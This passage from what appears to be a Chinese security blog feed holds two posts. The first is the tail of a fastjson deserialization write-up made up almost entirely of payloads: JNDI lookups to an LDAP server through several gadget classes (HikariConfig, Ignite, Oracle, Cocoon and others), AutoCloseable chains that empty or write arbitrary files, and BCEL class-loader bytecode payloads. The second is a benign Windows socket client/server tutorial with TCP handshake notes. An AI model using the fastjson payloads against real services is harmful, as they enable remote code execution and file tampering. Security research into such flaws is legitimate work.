class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable 清空指定文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable 清空指定文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable 任意文件写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.solr.common.util.FastOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tempBuffer&quot;</span><span class="punctuation">:</span><span class="string">&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sink&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">38</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;close&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.iq80.snappy.SnappyOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>BasicDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>SessionBeanProvider</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JMSContentInterceptor</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ContextClassLoaderSwitcher</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;contextClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>OracleManagedConnectionFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;xaDataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JNDIConfiguration</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastjson-反序列化漏洞&quot;&gt;&lt;a href=&quot;#fastjson-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;fastjson 反序列化漏洞&quot;&gt;&lt;/a&gt;fastjson 反序列化漏洞&lt;/h1&gt;&lt;h2 id=&quot;fastjson介绍&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="java安全" scheme="http://example.com/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="http://example.com/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>windows下socket通信</title>
    <link href="http://example.com/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/"/>
    <id>http://example.com/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/</id>
    <published>2022-07-31T13:16:50.000Z</published>
    <updated>2022-09-01T00:56:19.248Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">server.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;ws2_32.lib&quot;</span>)  <span class="comment">//加载 ws2_32.dll</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//初始化 DLL</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//绑定套接字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sockAddr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sockAddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(sockAddr));  <span class="comment">//每个字节都用0填充</span></span><br><span class="line">sockAddr.sin_family = PF_INET;  <span class="comment">//使用IPv4地址</span></span><br><span class="line">sockAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);  <span class="comment">//具体的IP地址</span></span><br><span class="line">sockAddr.sin_port = htons(<span class="number">1234</span>);  <span class="comment">//端口</span></span><br><span class="line">bind(servSock, (SOCKADDR*)&amp;sockAddr, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//进入监听状态</span></span><br><span class="line">listen(servSock, <span class="number">20</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//接收客户端请求</span></span><br><span class="line">SOCKADDR clntAddr;</span><br><span class="line"><span class="type">int</span> nSize = <span class="keyword">sizeof</span>(SOCKADDR);</span><br><span class="line">SOCKET clntSock = accept(servSock, (SOCKADDR*)&amp;clntAddr, &amp;nSize);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向客户端发送数据</span></span><br><span class="line"><span class="type">char</span> *str = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">send(clntSock, str, <span class="built_in">strlen</span>(str) + <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line">closesocket(clntSock);</span><br><span class="line">closesocket(servSock);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//终止 DLL 的使用</span></span><br><span class="line">WSACleanup();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">client.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)  <span class="comment">//加载 ws2_32.dll</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//初始化DLL</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向服务器发起请求</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sockAddr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sockAddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(sockAddr));  <span class="comment">//每个字节都用0填充</span></span><br><span class="line">sockAddr.sin_family = PF_INET;</span><br><span class="line">sockAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">sockAddr.sin_port = htons(<span class="number">1234</span>);</span><br><span class="line">connect(sock, (SOCKADDR*)&amp;sockAddr, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//接收服务器传回的数据</span></span><br><span class="line"><span class="type">char</span> szBuffer[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">recv(sock, szBuffer, MAXBYTE, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出接收到的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Message form server: %s\n&quot;</span>, szBuffer);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line">closesocket(sock);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//终止使用 DLL</span></span><br><span class="line">WSACleanup();</span><br><span class="line"> </span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别编译server.c&amp;client.c，先运行server.exe创建server端，后运行client.exe，可得结果如下</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220827003042019.png" alt="image-20220827003042019"> </p><p>wireshark抓包分析</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220827003739852.png" alt="image-20220827003739852"> </p><ol><li><p>根据SYN,ACK标识可以看到serve和client端三次握手建立TCP连接</p></li><li><p>根据PSH,ACK标识以及Len&#x3D;13可以看到serve和client端进行数据交互，传输了13个字符</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220827004644316.png" alt="image-20220827004644316"> </p></li><li><p>根据FIN,ACK标识可以看到serve和client端四次挥手，断开TCP连接</p></li></ol><p>这里再简单复习一下三次握手，四次挥手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">三次握手：</span><br><span class="line">刚开始客户端处于 closed 的状态，服务端处于 listen 状态。然后</span><br><span class="line">1、第一次握手：客户端给服务端发一个 SYN 报文，并指明客户端的初始化序列号 ISN（c）。此时客户端处于 SYN_Send 状态。</span><br><span class="line"></span><br><span class="line">2、第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，并且也是指定了自己的初始化序列号 ISN(s)，同时会把客户端的 ISN + 1 作为 ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD 的状态。</span><br><span class="line"></span><br><span class="line">3、第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，此时客户端处于 establised 状态。</span><br><span class="line"></span><br><span class="line">4、服务器收到 ACK 报文之后，也处于 establised 状态，此时，双方以建立起了链接。</span><br><span class="line"></span><br><span class="line">四次挥手：</span><br><span class="line">1、第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于FIN_WAIT1状态。</span><br><span class="line"></span><br><span class="line">2、第二次握手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 + 1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT状态。</span><br><span class="line"></span><br><span class="line">3、第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。</span><br><span class="line"></span><br><span class="line">4、第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 + 1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态</span><br><span class="line"></span><br><span class="line">5、服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="windows逆向" scheme="http://example.com/categories/windows%E9%80%86%E5%90%91/"/>
    
    <category term="编程" scheme="http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="二进制" scheme="http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    <category term="windows" scheme="http://example.com/tags/windows/"/>
    
    <category term="windows编程" scheme="http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
</feed>
